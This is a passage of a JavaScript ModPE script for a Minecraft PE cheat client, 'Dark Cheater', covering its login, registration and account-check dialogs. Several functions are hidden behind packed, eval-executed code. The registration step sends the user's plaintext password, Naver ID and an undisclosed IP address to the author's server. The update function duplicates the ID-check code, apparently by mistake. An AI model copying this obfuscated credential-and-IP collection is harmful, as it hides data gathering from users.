var menus = ["비밀번호 숨기기", "자동 로그인 사용"];
var bools = [true, false];
for(var n in menus){
chs[n] = new android.widget.CheckBox(ctx);
chs[n].setLayoutParams(new android.widget.LinearLayout.LayoutParams(-1, -2, 1));
chs[n].setText(menus[n]);
chs[n].setTextColor(white);
chs[n].setChecked(bools[n]);
chs[n].setId(n);
chs[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
switch(check.getId()){
case 0 : 
if(onoff) loc4.setInputType(android.text.InputType.TYPE_CLASS_TEXT|android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD);
else loc4.setInputType(android.text.InputType.TYPE_CLASS_TEXT);
break;
case 1 : 
bools[1] = onoff;
if(onoff) Dark.toast("매 달 1일에 자동 로그인이 해제 됩니다.");
break;
}
}
}));
lay2.addView(chs[n]);
}
var pad = dip2px(ctx, 2);
lay2.setPadding(pad, pad, pad, dip2px(ctx, 5));
layout.addView(lay2);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setTextColor(white);
loc2.setTextColor(white);
loc1.setText("아이디 : ");
loc1.setTextSize(18);
loc2.setHint("아이디를 입력하세요...");
layout.addView(loc1);
layout.addView(loc2);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
loc3.setTextColor(white);
loc4.setTextColor(white);
loc3.setText("비밀번호 : ");
loc3.setTextSize(18);
loc4.setHint("비밀번호를 입력하세요...");
loc4.setInputType(android.text.InputType.TYPE_CLASS_TEXT|android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD);
layout.addView(loc3);
layout.addView(loc4);
Dark.noFullScreen(loc2);
Dark.noFullScreen(loc4);
pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("Dark Cheater 로그인");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(loc2.getText().toString()==""){
Dark.toast("아이디가 입력되지 않았습니다.");
}
else{
Dark.toast("서버로부터 데이터를 받아오고 있습니다...");
Dark.login(loc2.getText().toString(), loc4.getText().toString(), bools[1]);
}
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}
else{
Dark.toast("제작자 측에서 로그인을 차단하였습니다.");
}
}
else{
Dark.toast("인터넷 연결을 확인하여주세요.");
}
}
}).start();
},
login : function(userId, password, tf){
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('y a="\\r\\g\\h\\k\\g\\b\\E\\b\\r\\O\\q\\A\\g\\b\\J\\g\\g\\O\\r\\W\\I\\I\\T\\T\\T\\n\\x\\k\\o\\O\\1t\\o\\1s\\n\\1a\\o\\H\\I\\r\\I\\k\\x\\J\\1f\\z\\k\\1f\\u\\q\\g\\1p\\1o\\1I\\A\\k\\I\\q\\o\\u\\A\\z\\D\\h\\g\\h\\n\\g\\1s\\g\\1S\\x\\q\\2e\\1n\\b\\u\\f\\g\\D\\h\\g\\h\\1j\\k\\o\\H\\1h\\f\\k\\1q\\f\\k\\b\\x\\f\\1a\\o\\x\\f\\D\\h\\g\\h\\b\\q\\f\\z\\u\\g\\J\\b\\W\\W\\b\\x\\f\\1a\\o\\x\\f\\K\\h\\r\\r\\T\\o\\k\\x\\b\\1n\\b\\u\\f\\g\\1J\\r\\f\\k\\1g\\h\\H\\f\\b\\1U\\b\\1h\\f\\H\\A\\1V\\M\\1d\\K\\c\\R\\S\\G\\c\\U\\V\\B\\p\\m\\n\\E\\c\\N\\Q\\P\\p\\m\\F\\c\\b\\2v\\n\\b\\g\\o\\h\\r\\g\\b\\1o\\b\\M\\M\\1d\\K\\c\\R\\S\\G\\c\\U\\V\\B\\p\\m\\n\\E\\c\\N\\Q\\P\\p\\m\\F\\c\\b\\M\\1d\\K\\c\\R\\S\\G\\c\\U\\V\\B\\p\\m\\n\\E\\c\\N\\Q\\P\\p\\m\\F\\c\\b\\R\\S\\G\\c\\U\\V\\B\\p\\m\\n\\E\\c\\N\\Q\\P\\p\\m\\F\\c\\b\\D\\h\\k\\1A\\c\\1H\\J\\f\\h\\g\\f\\k\\c\\1i\\1l\\1r\\1K\\c\\1L\\G\\1M\\1N\\1Q\\1R\\c\\O\\f\\c\\1i\\1l\\1r\\Z\\c\\m\\1T\\p\\m\\n\\b\\1m\\Z\\1x\\1W\\c\\1X\\1Z\\2a\\2b\\2c\\c\\2d\\2x\\2f\\2g\\c\\2h\\B\\p\\m\\b\\2i\\2j\\c\\1m\\Z\\1x\\2k\\c\\2l\\2m\\c\\2n\\c\\2r\\B\\p\\m\\n\\b\\u\\f\\g\\2t\\o\\z\\g\\J\\b\\1p\\b\\q\\o\\u\\A\\z\\D\\h\\g\\h\\b\\u\\f\\g\\1j\\1w\\q\\q\\1y\\f\\h\\k\\b\\n\\b\\r\\h\\1q\\f\\b\\F\\c\\b\\q\\A\\z\\f\\1g\\1w\\H\\1t\\f\\k\\b\\q\\h\\z\\u".1z("\\b");1v 1B[a[1C]].1D({1E:1F(){1G{y Y=j[a[5]](j[a[4]](a[3])).1k()[a[2]](a[1]);y 1e=1O;1P(y L=0;L<Y[a[6]];L++){y d=Y[L][a[2]](a[7]);l(d[1]==1c){l(1b==j[a[8]](d[2].1k())){l(d[3]==a[9]){l(d[0]==1Y[a[10]]()){l(d[4]==a[11]){w=3;v=i;s=i;j[a[14]](a[12]+d[0]+a[13])}t{l(d[4]==a[15]){w=3;v=i;s=i;j[a[14]](a[16]+d[0]+a[13])}t{l(d[4]==a[9]){w=2;v=i;s=i;j[a[14]](a[17]+d[0]+a[13])}t{w=1;v=i;s=i;j[a[14]](a[18]+d[0]+a[13])}}};1u=d[0]}t{j[a[14]](a[19])}}t{l(d[4]==a[11]){w=3;v=i;s=i;j[a[14]](a[12]+d[0]+a[13])}t{l(d[4]==a[15]){w=3;v=i;s=i;j[a[14]](a[16]+d[0]+a[13])}t{l(d[4]==a[9]){w=2;v=i;s=i;j[a[14]](a[17]+d[0]+a[13])}t{w=1;v=i;s=i;j[a[14]](a[18]+d[0]+a[13])}}};1u=d[0]}}t{j[a[14]](a[20])};1e=i;2o}};l(!1e){j[a[14]](a[21])};2p=[1c,1b];l(2q&&s){y X=1v 2s();y C=X[a[22]]()+1;l(C<10){C=a[23]+C};j[a[27]](a[24],1c+a[7]+1b+a[7]+X[a[25]]()+a[26]+C)}}2u(e){2w(e+a[28]+e[a[29]])}}})[a[0]]()',62,158,'||||||||||_0xee85|xLP|x20|_0xaa98x4||x65|x74|x61|true|Dark|x72|if|uB2E4|x2E|x6F|uB2C8|x6C|x73|isLogined|else|x67|loginCheck|loginType|x64|var|x6E|x69|uC2B5|_0xaa98x6|x44|x0A|x2C|uC778|x6D|x2F|x68|x50|_0xaa98x3|x56|uD658|x70|uD569|uC601|uB85C|uADF8|x77|uB418|uC5C8|x3A|_0xaa98x5|_0xaa98x1|uC774|||||||||||x63|password|userId|x49|_0xaa98x2|x6A|x4E|x53|uB2C9|x46|toString|uB124|uC544|x31|x32|x30|x76|uC784|x78|x62|loginNick|new|x75|uB514|x59|split|x6B|java|30|Thread|run|function|try|x43|x79|x55|uACFC|uB9C8|uD06C|uB798|false|for|uD504|uD2B8|x3F|uB985|x33|x2D|uC640|uBE44|ModPE|uBC00|||||||||||uBC88|uD638|uAC00|uC77C|x3D|uD558|uC9C0|uC54A|uD574|uB2F9|uB97C|uCC3E|uC744|uC218|break|loginInfo|tf|uC5C6|Date|x4D|catch|uB2D8|clientMessage|uCE58'.split('|'),0,{});
eval(code);
},
logoutDialog : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
dialog.setTitle("Dark Cheater 로그아웃");
dialog.setMessage("로그아웃 하시겠습니까?");
dialog.setNegativeButton("아니요", null);
dialog.setPositiveButton("네", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
isLogined = false;
loginCache = null;
Dark.toast("로그아웃 되었습니다.");
File.remove(sdcard+"/darkTornado/darkCheater/loginData.txt");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
},
sendDataToServer : function(title, value){
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('X a="\\l\\d\\i\\f\\d\\b\\r\\p\\g\\c\\h\\d\\b\\g\\n\\q\\p\\b\\x\\d\\d\\q\\b\\i\\q\\i\\r\\x\\c\\b\\x\\d\\d\\q\\l\\s\\w\\w\\G\\G\\G\\J\\m\\f\\k\\q\\V\\k\\y\\J\\r\\k\\n\\w\\l\\w\\1j\\1m\\g\\h\\1w\\p\\m\\q\\1y\\y\\n\\r\\z\\R\\P\\w\\l\\c\\h\\m\\g\\h\\t\\I\\g\\h\\C\\J\\d\\y\\d\\1E\\m\\p\\1b\\P\\b\\t\\c\\d\\D\\i\\d\\i\\1l\\f\\k\\n\\E\\c\\f\\1u\\c\\f\\b\\N\\b\\T\\o\\b\\o\\o\\N\\l\\c\\h\\m\\c\\f\\D\\i\\d\\i\\T\\o\\h\\g\\r\\C\\A\\i\\n\\c\\j\\s\\j\\b\\t\\c\\d\\1i\\l\\c\\f\\A\\i\\n\\c\\b\\o\\g\\q\\j\\s\\j\\b\\t\\c\\d\\B\\1k\\L\\q\\b\\o\\i\\h\\m\\f\\k\\g\\m\\v\\c\\f\\l\\g\\k\\h\\j\\s\\j\\b\\M\\u\\I\\u\\1x\\E\\u\\b\\v\\u\\M\\E\\L\\O\\A\\b\\1I\\z\\g\\p\\m\\b\\k\\l\\b\\o\\n\\k\\m\\c\\p\\j\\s\\j\\b\\B\\O\\D\\u\\I\\b\\o\\m\\i\\f\\C\\Q\\x\\c\\i\\d\\c\\f\\v\\c\\f\\l\\g\\k\\h\\j\\s\\j\\b\\o\\B\\Q\\Y\\u\\v\\c\\f\\l\\g\\k\\h\\j\\s\\j\\b\\t\\c\\d\\B\\g\\h\\c\\r\\f\\i\\R\\d\\v\\c\\f\\l\\g\\k\\h\\b\\n\\c\\d\\x\\k\\m\\l\\b\\c\\y\\c\\r\\z\\d\\c\\b\\Z\\j\\b\\p\\g\\h\\c\\A\\z\\n\\V\\c\\f\\b\\p\\i\\h\\t".1a("\\b");F 1c[a[1d]].1e({1f:1g(){1h{X S=F K[a[4]][a[3]][a[2]][a[1]].1n();S[a[1o]](F K[a[4]][a[3]][a[1]][a[1p]].1q(1r(1s[a[6]](a[5])+a[7]+1t.U()+a[8]+1v.U()+a[9]+H[a[10]]()+a[11]+H[a[12]]()+a[13]+W[a[17]][a[16]][a[15]][a[14]]+a[18]+W[a[17]][a[16]][a[19]]+a[1z]+1A+a[1B]+H[a[1C]]())))}1D(e){1F(e+a[1G]+e[a[1H]])}}})[a[0]]();',62,107,'||||||||||_0xd283|xXZ|x65|x74||x72|x69|x6E|x61|x20|x6F|x73|x64|x6D|x0A|x6C|x70|x63|x3A|x67|x45|x56|x2F|x68|x78|x75|x4E|x4D|x6B|x44|x53|new|x77|ModPE|x4C|x2E|org|x49|x52|x3C|x4F|x31|x43|x66|_0xeb3ex1|x3E|toString|x62|android|var|x50|x2C|||||||||||split|x3D|java|27|Thread|run|function|try|x55|x36|x79|x46|x71|DefaultHttpClient|24|23|HttpPost|encodeURI|Dark|title|x76|value|x35|x41|x30|20|version|21|22|catch|x3F|clientMessage|25|26|x42'.split('|'),0,{});
eval(code);
},
register : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var a1_v = 0, a6_v = 0;
var nec = 0;
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var q1 = new android.widget.TextView(ctx);
var i1 = new android.widget.TextView(ctx);
var a1 = new android.widget.RadioGroup(ctx);
q1.setText("1. Dark Cheater 회원 약관에 동의하십니까?");
q1.setTextSize(16);
q1.setTextColor(white);
i1.setText("  [회원 약관 보기]\n거절할 시, 다크 치터 회원 가입이 불가능합니다.");
i1.setTextSize(13);
i1.setTextColor(white);
i1.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
new java.lang.Thread({
run : function(){
Dark.showDialog("Dark Cheater 회원 약관", Dark.getDataFromServer("http://darktornado.dothome.co.kr/darkCheater/darkCheaterMemberTerms.txt"));
}
}).start();
}
});
a1.setOrientation(1);
var a1_1 = new android.widget.RadioButton(ctx);
var a1_2 = new android.widget.RadioButton(ctx);
a1_1.setText("동의");
a1_2.setText("거절");
a1_1.setId(1);
a1_2.setId(2);
a1_1.setTextColor(white);
a1_2.setTextColor(white);
a1_1.setTextSize(14);
a1_2.setTextSize(14);
a1.addView(a1_1);
a1.addView(a1_2);
a1.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
a1_v = checkedId;
}
}));
var q2 = new android.widget.TextView(ctx);
var i2 = new android.widget.TextView(ctx);
var a2 = new android.widget.EditText(ctx);
q2.setText("\n2. 사용하고자 하는 Dark Cheater 닉네임을 입력하세요.");
q2.setTextSize(16);
q2.setTextColor(white);
i2.setText("Dark Cheater에서의 닉네임입니다. 한글 가능. ::가 포함된 글자 불가.");
i2.setTextSize(13);
i2.setTextColor(white);
a2.setHint("사용할 닉네임을 입력하세요...");
a2.setTextColor(white);
var q3 = new android.widget.TextView(ctx);
var i3 = new android.widget.TextView(ctx);
var a3 = new android.widget.EditText(ctx);
q3.setText("\n3. 사용하고자 하는 Dark Cheater 아이디를 입력하세요.");
q3.setTextSize(16);
q3.setTextColor(white);
i3.setText("  [아이디 중복 확인]\nDark Cheater 회원 로그인에 사용할 아이디를 입력하세요. 한글 가능. ::가 포함된 글자 불가. 아이디 중복 확인 필수.");
i3.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
Dark.toast("회원 정보를 불러와서 비교하는 중입니다...");
Dark.checkIds(a3.getText().toString());
}
});
i3.setTextSize(13);
i3.setTextColor(white);
a3.setHint("사용할 아이디를 입력하세요...");
a3.setTextColor(white);
a3.setOnTouchListener(new android.view.View.OnTouchListener(){
onTouch: function(v, ev){
if(ev.getAction()==android.view.MotionEvent.ACTION_UP){
if(!isUsableId) Dark.toast("아이디 입력 후 [아이디 중복 확인]을 터치하여 아이디 중복 확인을 해주세요.");
}
return false;
}
});
var q4 = new android.widget.TextView(ctx);
var i4 = new android.widget.TextView(ctx);
var a4 = new android.widget.EditText(ctx);
q4.setText("\n4. 사용하고자 하는 Dark Cheater 비밀번호를 입력하세요.");
q4.setTextSize(16);
q4.setTextColor(white);
i4.setText("Dark Cheater 회원 로그인에 사용할 비밀번호를 입력하세요. 한글 가능. ::, %가 포함된 글자 불가.");
i4.setTextSize(13);
i4.setTextColor(white);
a4.setHint("사용할 비밀번호를 입력하세요...");
a4.setTextColor(white);
var q5 = new android.widget.TextView(ctx);
var i5 = new android.widget.TextView(ctx);
var a5 = new android.widget.EditText(ctx);
q5.setText("\n5. 네이버 아이디를 입력해주세요.");
q5.setTextSize(16);
q5.setTextColor(white);
i5.setText("회원 구분을 위해 이용 약관에 따라 네이버 아이디도 수집합니다. 로그인 전용 아이디나 E-Mail이 아닌, 네이버 아이디입니다.");
i5.setTextSize(13);
i5.setTextColor(white);
a5.setHint("네이버 아이디를 입력하세요...");
a5.setTextColor(white);
a5.addTextChangedListener(new android.text.TextWatcher({
onTextChanged : function(str, start, before, count){
if(str.toString().search("@")!=-1){
Dark.toast("E-Mail이 아닌, 아이디입니다.");
nec++;
}
}
}));
var q6 = new android.widget.TextView(ctx);
var i6 = new android.widget.TextView(ctx);
var a6 = new android.widget.RadioGroup(ctx);
q6.setText("\n6. NMC 서비스 신청 (선택)");
q6.setTextSize(16);
q6.setTextColor(white);
i6.setText("NMC 서비스(Nickname Matching Service, 닉네임 일치 확인 서비스)는 로그인 시, 다크 치터 닉네임과 마인크래프트 pe 닉네임이 일치하는지를 확인하여, 일치하면 로그인을 하고, 일치하지 않으면 로그인을 하지 않는 서비스입니다. 항목 입력이 없으면 신청 안함으로 구분합니다. MCPE 0.11.0 이후부터는 한글 닉네임 등을 지원하지 않기 때문에, Dark Cheater 닉네임을 한글로 신청하고 NMC 서비스를 신청하면 로그인이 불가능함으로, 회원가입 신청이 거절됩니다.");
i6.setTextSize(13);
i6.setTextColor(white);
a6.setOrientation(1);
var a6_1 = new android.widget.RadioButton(ctx);
var a6_2 = new android.widget.RadioButton(ctx);
a6_1.setText("신청");
a6_2.setText("신청 안함");
a6_1.setId(1);
a6_2.setId(2);
a6_1.setTextColor(white);
a6_2.setTextColor(white);
a6_1.setTextSize(14);
a6_2.setTextSize(14);
a6.addView(a6_1);
a6.addView(a6_2);
a6.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
a6_v = checkedId;
if(checkedId==1){
var checkHangul = false;
var dcn = String(a2.getText().toString());
for(var n=0;n<dcn.length;n++){
if(dcn.charCodeAt(n)>=44032&&dcn.charCodeAt(n)<=55203){
Dark.toast("NMC 서비스를 신청하고 다크 치터 닉네임을 한글로 하면, 회원 가입 신청을 수락하여도 로그인 할 수 없음으로 회원 가입 신청이 자동으로 거절됩니다.");
break;
}
}
}
}
}));
for(var n=1;n<7;n++){
eval("layout.addView(q"+n+");layout.addView(i"+n+");layout.addView(a"+n+");");
}
Dark.noFullScreen(a2);
Dark.noFullScreen(a3);
Dark.noFullScreen(a4);
Dark.noFullScreen(a5);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("Dark Cheater 회원 가입");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
Dark.toast("처리 중입니다...");
new java.lang.Thread({
run : function(){
try{
if(a1_v==1){
if(isUsableId){
var cannotLogin = false;
var dcn = String(a2.getText().toString());
for(var n=0;n<dcn.length;n++){
if(dcn.charCodeAt(n)>=44032&&dcn.charCodeAt(n)<=55203){
cannotLogin = true;
break;
}
}
if(a2.getText().toString()==""||a3.getText().toString()==""||a4.getText().toString()==""||a5.getText().toString()==""){
Dark.showDialog("회원 가입 신청 거부", "입력하지 않은 정보가 있어서 회원 가입 신청이 자동으로 거절되었습니다.");
}
else if(cannotLogin&&a6_v==1){
Dark.showDialog("회원 가입 신청 거부", "회원 가입 신청을 수락하여도 로그인 할 수 없음으로, 회원 가입 신청이 자동으로 거절되었습니다.\nNMC 서비스를 신청하신 경우, Dark Cheater 닉네임과 MCPE 닉네임이 일치하지 않으면 로그인을 하지 못하게 막는 서비스입니다만, Dark Cheaeter 닉네임에 한글이 포함되어 있고, MCPE 닉네임에는 한글 사용이 불가능함으로, 어차피 수락해도 로그인이 불가능하여 회원 가입 신청이 자동으로 거절되었습니다.");
}
else if(!Dark.isValidNaverId(a5.getText().toString())){
Dark.showDialog("회원 가입 신청 거부", "존재하지 않는 네이버 ID를 입력하셨습니다. 로그인 전용 아이디나 E-Mail이 아닌, '네이버 아이디'를 입력하셔야 합니다.");
}
else{
Dark.toast("제작자에게 회원 가입 신청을 보내고 있습니다...");
new java.lang.Thread({
run : function(){
var code = function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4 7="신청 안함";4 5="0";j(f==1){7="신청";5="1"}4 8="닉네임 : "+9.2()+"\\3아이디 : "+a.2()+"\\3비밀번호 : "+c.2()+"\\3네이버 아이디 : "+d.2()+"\\e 서비스 신청 : "+7+"\\3\\3마크닉 : "+b.g()+"\\h : "+b.i()+"\\3\\3"+9.2()+"::"+a.2()+"::"+c.2()+"::"+5+"::0::"+d.2();6.k("회원가입 신청",8);6.l("6 m 회원가입이 신청되었습니다.\\3  수락 여부는 수락/거절 이후 제작자의 블로그에서 확인하실 수 있습니다.");',23,23,'||getText|n|var|a6_v3|Dark|a6_v2|value|a2|a3|ModPE|a4|a5|nNMC|a6_v|getUserName|nip|getMyIp|if|sendDataToServer|toast|Cheater'.split('|'),0,{});
eval(code);
}
}).start();
}
}
else{
Dark.showDialog("회원 가입 신청 거부", "아이디 중복 확인을 하지 않으셨거나, 이미 사용중인 아이디를 입력하셨습니다.");
}
}
else{
Dark.toast("약관에 동의하셔야 회원 가입 신청이 가능합니다.");
}
}catch(e){clientMessage(e);}
}
}).start();
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
},
checkPermission : function(type){
try{
var perm = Dark.getDataFromServer(GitHubLink+"userPermission.txt").toString().split("&");
for(var n in perm){
if(type==perm[n]) return true;
}
return false;
}
catch(e){
Dark.showError(e);
}
},
checkIds : function(userId){
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('o a="\\m\\b\\d\\e\\b\\c\\1l\\c\\m\\x\\h\\u\\b\\c\\B\\b\\b\\x\\m\\t\\k\\k\\y\\y\\y\\j\\l\\e\\f\\x\\1i\\f\\D\\j\\E\\f\\F\\k\\m\\k\\e\\l\\B\\I\\q\\e\\I\\p\\h\\b\\1h\\1f\\1c\\u\\e\\k\\h\\f\\p\\u\\q\\s\\d\\b\\d\\j\\b\\D\\b\\1b\\l\\h\\1a\\17\\c\\p\\i\\b\\s\\d\\b\\d\\16\\e\\f\\F\\U\\i\\e\\T\\i\\e\\c\\l\\i\\E\\f\\l\\i\\s\\d\\b\\d\\c\\t\\t\\c\\w\\S\\g\\R\\Q\\M\\M\\g\\N\\O\\P\\18\\g\\L\\w\\K\\J\\H\\G\\j\\c\\b\\f\\d\\m\\b\\c\\N\\O\\V\\g\\W\\g\\X\\Y\\g\\L\\w\\K\\J\\H\\G\\j\\c\\h\\d\\q\\p".Z("\\c");11 12[a[10]].13({14:15(){o v=n[a[5]](n[a[4]](a[3])).19()[a[2]](a[1]);r=1d;1e(o A 1g v){o z=v[A][a[2]](a[6]);C(z[1]==1j){r=1k;n[a[8]](a[7]);1m}};C(r){n[a[8]](a[9])}}})[a[0]]()',62,85,'||||||||||_0x6a12|x74|xXZ|x61|x72|x6F|x20|x6C|x65|x2E|x2F|x64|x73|Dark|var|x67|x6E|isUsableId|x44|x3A|x69|_0xa882x1|uC774|x70|x77|_0xa882x3|_0xa882x2|x68|if|x78|x63|x6D|uB2E4|uB2C8|x6A|uC785|uB514|uC544|uAC00|uC0AC|uC6A9|uC911|uAD70|uB204|uBBF8|x76|x53|uD560|uC218|uC788|uB294|split||new|java|Thread|run|function|x46|x31|uC778|toString|x3D|x3F|x79|true|for|x32|in|x30|x62|userId|false|x0A|break'.split('|'),0,{});
eval(code);
},
getBatteryLevel : function(){
try{
var ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
var batteryStatus = ctx.registerReceiver(null, ifilter);
var level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
var scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
return Math.round(level/scale*100);
}
catch(e){
Dark.showError(e);
}
},
getBatteryTemp : function(){
try{
var ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
var batteryStatus = ctx.registerReceiver(null, ifilter);
var temp = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, -1);
return Math.round(temp)/10;
}
catch(e){
Dark.showError(e);
}
},
checkEnchant : function(){
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('f a=["\\j\\b\\c\\J\\i\\c\\1k\\c\\1g","\\j\\b\\c\\1f\\e\\w\\b","\\j\\b\\c\\H\\b\\k\\b\\x\\c\\b\\y\\H\\k\\u\\c\\Y\\y","\\j\\b\\c\\J\\i\\x\\F\\e\\i\\c\\w\\b\\i\\c\\s","\\W\\o\\S\\O\\d\\G\\z\\I\\18\\d\\p\\o\\A\\P\\d\\T\\X\\B\\Z\\C\\d\\1c\\1i\\B\\1m\\1s\\1t\\L\\M","\\c\\u\\e\\s\\c","","\\N","\\r\\b\\D\\k\\e\\x\\b","\\C\\d\\Q\\R\\d\\v\\d","\\G\\z\\I\\d\\p\\o\\E\\d\\v\\d","\\p\\o\\A\\d\\p\\o\\E\\d\\v\\d","\\s\\c\\e\\r\\c","\\s\\k\\b\\b\\D","\\U\\F\\r\\b\\e\\y","\\k\\e\\i\\j","\\r\\b\\w\\u\\V\\b"];f m=q[a[0]]();f l=q[a[1]](m);f t=q[a[3]](q[a[2]]());17(t[0]!=1z&&19!=m&&1a!=l){1b[a[5]](l+a[4]);1d(l+a[4],1e);f h=a[6];1h(f n 1j t){h+=a[7]+t[n]};h=h[a[8]](/1l/g,a[6])[a[8]](/1n=/g,a[10])[a[8]](/.1o=/g,a[9])[a[8]](/\\[/g,a[6])[a[8]](/]/g,a[6]);1p(l,m,a[11]+1q()+h);1r K[a[15]].1u({1v:1w(){K[a[15]][a[14]][a[13]](1x);1y[a[16]](m)}})[a[12]]()}',62,98,'||||||||||_0xda83|x65|x74|x20|x61|var||str|x6E|x67|x6C|pn|pe||uC774|uC544|Player|x72|x73|enchantInfo|x6F|x3A|x6D|x63|x64|uCCB8|uD15C|uD558|x2C|x70|uB514|x68|uC778|x53|uD2B8|x45|java|uB2E4|x2E|x0A|uAC00|uC744|uAC15|uB3C4|x29|uC0AC|x54|x76|x28|uC6A9|x49|uC5EC||||||||if|uB41C|ad|mnmn|Dark|uCD94|darkMessage|true|x4E|x79|for|uBC29|in|x69|EnchantmentInstance|uC600|type|level|kickDialog|getCarriedItem|new|uC2B5|uB2C8|Thread|run|function|1000|Entity|null'.split('|'),0,{});
eval(code);
},
update : function(){
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('o a="\\m\\b\\d\\e\\b\\c\\1l\\c\\m\\x\\h\\u\\b\\c\\B\\b\\b\\x\\m\\t\\k\\k\\y\\y\\y\\j\\l\\e\\f\\x\\1i\\f\\D\\j\\E\\f\\F\\k\\m\\k\\e\\l\\B\\I\\q\\e\\I\\p\\h\\b\\1h\\1f\\1c\\u\\e\\k\\h\\f\\p\\u\\q\\s\\d\\b\\d\\j\\b\\D\\b\\1b\\l\\h\\1a\\17\\c\\p\\i\\b\\s\\d\\b\\d\\16\\e\\f\\F\\U\\i\\e\\T\\i\\e\\c\\l\\i\\E\\f\\l\\i\\s\\d\\b\\d\\c\\t\\t\\c\\w\\S\\g\\R\\Q\\M\\M\\g\\N\\O\\P\\18\\g\\L\\w\\K\\J\\H\\G\\j\\c\\b\\f\\d\\m\\b\\c\\N\\O\\V\\g\\W\\g\\X\\Y\\g\\L\\w\\K\\J\\H\\G\\j\\c\\h\\d\\q\\p".Z("\\c");11 12[a[10]].13({14:15(){o v=n[a[5]](n[a[4]](a[3])).19()[a[2]](a[1]);r=1d;1e(o A 1g v){o z=v[A][a[2]](a[6]);C(z[1]==1j){r=1k;n[a[8]](a[7]);1m}};C(r){n[a[8]](a[9])}}})[a[0]]();',62,85,'||||||||||_0xb750|x74|xXZ|x61|x72|x6F|x20|x6C|x65|x2E|x2F|x64|x73|Dark|var|x67|x6E|isUsableId|x44|x3A|x69|_0xa925x1|uC774|x70|x77|_0xa925x3|_0xa925x2|x68|if|x78|x63|x6D|uB2E4|uB2C8|x6A|uC785|uB514|uC544|uAC00|uC0AC|uC6A9|uC911|uAD70|uB204|uBBF8|x76|x53|uD560|uC218|uC788|uB294|split||new|java|Thread|run|function|x46|x31|uC778|toString|x3D|x3F|x79|true|for|x32|in|x30|x62|userId|false|x0A|break'.split('|'),0,{});
eval(code);
},
clearChat : function(){
var pe= Player.getEntity();
var pn = Player.getName(pe);
Entity.setNameTag(pe, "");
for(var n=0;n<20;n++){
ScriptManager.nativeSendChat("");
if(fixSendChat) clientMessage("");
}
Entity.setNameTag(pe, pn);
},
dataSave : function(name, msg){
